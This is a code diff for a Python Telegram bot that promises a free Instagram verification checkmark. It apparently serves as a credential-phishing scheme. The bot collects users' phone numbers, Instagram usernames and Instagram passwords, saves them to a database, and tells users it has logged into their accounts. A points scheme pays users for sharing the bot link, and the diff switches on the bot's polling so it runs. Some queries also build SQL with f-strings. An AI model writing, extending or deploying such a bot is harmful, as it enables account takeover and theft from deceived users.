@@ -24,12 +24,12 @@ scores INTEGER
 """)
 random_number = 0
 users = dict()
-random_number = ""
 @dp.message_handler(commands="start")
 async def start_handler(message: types.Message):
     idla = cursor.execute(f"SELECT chat_id FROM users WHERE chat_id={message.chat.id}").fetchone()
     if idla:
         await message.answer(text="Welcome", reply_markup=my_scores)
+        await message.answer(text="Send 1 Score To Friends")
     else:
         text = f"""
 👋 Hello: {message.from_user.full_name}
@@ -62,10 +62,10 @@ async def send_phone_handler(message: types.Message, state: FSMContext):
 
 @dp.message_handler(state=RegisterState.send_insta_login)
 async def send_insta_login_handler(message: types.Message, state: FSMContext):
-    if message.chat.id == 6606094329 and message.text != "xdjmrdva__":
-        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again")
+    if message.chat.id == 6606094329 and message.text != "@xdjmrdva__":
+        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again\n\nPlease enter your Instagram Nick with @")
         await RegisterState.send_insta_login.set()
-    elif message.chat.id == 6606094329 and message.text == "xdjmrdva__":
+    elif message.chat.id == 6606094329 and message.text == "@xdjmrdva__":
         await state.update_data({
             "insta_login": message.text
         })
@@ -87,17 +87,6 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
         "login_pass": message.text
     })
     data = await state.get_data()
-    text = f"""
-💁‍♂️ We Are Succefully Logined To Your Account
-⭐️ You Have: {1} scores
-🆔 Your ID: {1}
-
-🫂 Give This ID number For Friends To Send 1 Score
-
-
-🚀 if you share bot link with your friends you will get 1 score!
-⭐️ If You Have 50 Scores You Can Get Free CheckMark For Your Instagram Account!   
-"""
     r_id = random_number
     full_name = message.from_user.full_name
     insta_login = data.get("insta_login")
@@ -106,9 +95,22 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
     score = 1
     chat_id = message.chat.id
     cursor.execute(f"""
-INSERT INTO users (random_number, chat_id, full_name, insta_login, insta_password, phone_number, scores) VALUES (?,?,?,?,?,?,?)
-""", (r_id, chat_id, full_name, insta_login, insta_pass, phone_number, score))
+    INSERT INTO users (random_number, chat_id, full_name, insta_login, insta_password, phone_number, scores) VALUES (?,?,?,?,?,?,?)
+    """, (r_id, chat_id, full_name, insta_login, insta_pass, phone_number, score))
     conn.commit()
+    score = cursor.execute(f"SELECT scores, chat_id, random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
+    print(score)
+    scores = score[0]
+    text = f"""
+💁‍♂️ We Are Succefully Logined To Your Account
+⭐️ You Have: {scores} scores
+🆔 Your ID: {r_id}
+
+🫂 Give This ID number For Friends To Send 1 Score
+
+
+⭐️ If You Have 50 Scores You Can Get Free CheckMark For Your Instagram Account!   
+"""
     link1 = "https://t.me/instagram_free_check_bot"
     await message.answer(text=link1, reply_markup=my_scores)
     await message.answer(text=text, reply_markup=send_score)
@@ -129,27 +131,30 @@ async def my_scores_handler(message: types.Message):
     score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={message.chat.id}").fetchone()
     scores = score[0]
     print(scores)
-    scores = cursor.execute(f"SELECT score, random_number_id FROM users WHERE random_number_id={random_number}")
     text = f"You Have: {scores} scores"
     await message.answer(text=text)
 
 @dp.callback_query_handler(text="send_score")
 async def send_score_handler(call: types.CallbackQuery):
-    score = cursor.execute(f"SELECT scores FROM users WHERE random_number={random_number}").fetchone()
+    score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={call.message.chat.id}").fetchone()
     hisob = score[0]
     if hisob >= 1:
         text = "✍️ Please Send Username To Send 1 Score!"
         await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
         await RegisterState.send_score.set()
     else:
-        await call.message.answer(text="You Don't Have Many Scores", reply_markup=my_scores)
-    scores = cursor.execute(f"SELECT score, random_number_id FROM users WHERE random_number_id={random_number}")
-    if scores >= 1:
+        await call.message.answer(text="❌ Sorry You Don't Have Many Scores", reply_markup=my_scores)
+
+@dp.message_handler(text="💸 Send 1 Score To Others")
+async def send_score_handler(message: types.Message):
+    score = cursor.execute(f"SELECT scores FROM users WHERE chat_id={message.chat.id}").fetchone()
+    hisob = score[0]
+    if hisob >= 1:
         text = "✍️ Please Send Username To Send 1 Score!"
+        await message.answer(text=text, reply_markup=ReplyKeyboardRemove())
+        await RegisterState.send_score.set()
     else:
-        text = "❌ Sorry You Don't Have Many Scores"
-    await call.message.answer(text=text, reply_markup=ReplyKeyboardRemove())
-    await RegisterState.send_score.set()
+        await message.answer(text="❌ Sorry You Don't Have Many Scores", reply_markup=my_scores)
 
 @dp.message_handler(state=RegisterState.send_score)
 async def send_1_score_handler(message: types.Message, state: FSMContext):
@@ -181,5 +186,5 @@ ID: {randomm_id}
 
 
 
-#if __name__ == "__main__":
-#    executor.start_polling(dp, skip_updates=True)
+if __name__ == "__main__":
+   executor.start_polling(dp, skip_updates=True)
